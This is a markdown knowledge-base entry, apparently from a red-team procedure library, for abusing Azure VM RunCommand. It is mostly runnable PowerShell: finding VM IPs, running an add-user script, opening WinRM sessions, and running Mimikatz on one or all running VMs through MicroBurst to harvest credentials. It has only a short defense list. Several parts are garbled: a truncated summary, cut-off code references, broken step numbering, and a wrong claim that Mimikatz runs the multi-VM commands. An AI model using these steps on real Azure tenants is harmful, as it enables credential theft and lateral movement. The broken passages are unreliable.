---
id: 9495c91b-9210-47c2-a30f-f12a79daadee
name: Azure VM RunCommand Execution
type: procedure
verified: true
submitted: true
created_at: '2023-04-06T03:56:15.621906+00:00'
updated_at: '2023-05-28T03:59:38.583686+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Execution through API|T1106 - Execution through API]]'
- '[[Remote Desktop Protocol|T1076 - Remote Desktop Protocol]]'
platforms:
- Cloud
tags:
- '[[Cloud - Azure]]'
- '[[Virtual Machine RunCommand]]'
commands:
- '[[Connect via WinRM]]'
- '[[Excecute Mimikatz on the all VMs in Azure with Microburst]]'
- '[[Execute Powershell script on the VM]]'
- '[[Execute Powershell script on the VM]]'
- '[[Get Public IP of VM]]'
- '[[List available VMs]]'
---

# Azure VM RunCommand Execution

**Status**: ✓ Verified

## Summary

The Azure VM RunCommand Execution procedure allows an attacker to execute PowerShell scripts and commands on Azure virtual machines (VMs). This can be used to gain remote code execution on a target VM, allowing the attacker to move laterally through the network and potentially gain access to sensit

## Description

# Description

The Azure VM RunCommand Execution procedure allows an attacker to execute PowerShell scripts and commands on Azure virtual machines (VMs). This can be used to gain remote code execution on a target VM, allowing the attacker to move laterally through the network and potentially gain access to sensitive data. The procedure involves using the Azure portal or Azure CLI to execute the RunCommand on a target VM, which can then be used to execute PowerShell commands or scripts. This can be done either by connecting to the VM via WinRM, or by executing commands on multiple VMs simultaneously using Mimikatz. 

From a technical perspective, this procedure leverages the Azure RunCommand feature, which allows users to execute scripts and commands on Azure VMs. The feature uses the Azure VM Agent to execute the command or script, which runs as the SYSTEM user on the target VM. This can be used by an attacker to gain access to sensitive information or to move laterally through the network. From a business perspective, this procedure highlights the importance of securing access to Azure VMs and monitoring for suspicious activity.

## Requirements

1. Valid authentication credentials for the Azure portal or Azure CLI ('* `Microsoft.Compute/virtualMachines/runCommand/action')`

1. Access to the target Azure VM(s)

1. WinRM access to the target VM(s) (if using WinRM to connect)

## Defense

1. Ensure that access to the Azure portal or Azure CLI is restricted to authorized personnel only

1. Monitor for suspicious activity on Azure VMs, including the use of RunCommand and WinRM

1. Implement network segmentation and access controls to limit lateral movement

## Objectives

1. Gain remote code execution on a target Azure VM

1. Move laterally through the network to gain access to sensitive data

1. Execute Mimikatz on multiple Azure VMs to obtain credentials

# Instructions

*<u>Overv*iew</u>

*<u>adduser.p*s1:</u>

**Code**: [[# adduser.ps1
$passwd = ConvertTo-SecureString "P@]]

**Code**: [[# Get Public IP of VM : query the network interfac]]

## 

## Steps

1. Get the public IP of the VM by querying the network interface 

**Command** ([[Get Public IP of VM]]):

```bash
Get-AzVM -Name <RESOURCE> -ResourceGroupName <RG-NAME> | select -ExpandProperty NetworkProfile
Get-AzNetworkInterface -Name <RESOURCE368>
Get-AzPublicIpAddress -Name <RESOURCEIP>
```

**Command** ([[Execute Powershell script on the VM]]):

```powershell
Invoke-AzVMRunCommand -VMName <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\Tools\adduser.ps1' -Verbose
```

**Command** ([[Connect via WinRM]]):

```bash
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('username', $Password)
$sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
```

            4. List all virtual machines currently runnong on Azure. Filtering out the virtual machines that are not running.

**Command** ([[List available VMs]]):

```bash
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
```

**Command** ([[Execute Powershell script on the VM]]):

```powershell
Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
```

            6. (Optional) This command imports the MicroBurst PowerShell module and executes the Mimikatz script on multiple Azure VMs. 

**Command** ([[Excecute Mimikatz on the all VMs in Azure with Microburst]]):

```powershell
PS C:\> Import-module MicroBurst.psm1
PS C:\> Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```

## Platforms

- Cloud

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Execution through API|T1106 - Execution through API]]
- [[Remote Desktop Protocol|T1076 - Remote Desktop Protocol]]

## Commands Used

- [[Connect via WinRM]]
- [[Excecute Mimikatz on the all VMs in Azure with Microburst]]
- [[Execute Powershell script on the VM]]
- [[Execute Powershell script on the VM]]
- [[Get Public IP of VM]]
- [[List available VMs]]

## Tags

- [[Cloud - Azure]]
- [[Virtual Machine RunCommand]]
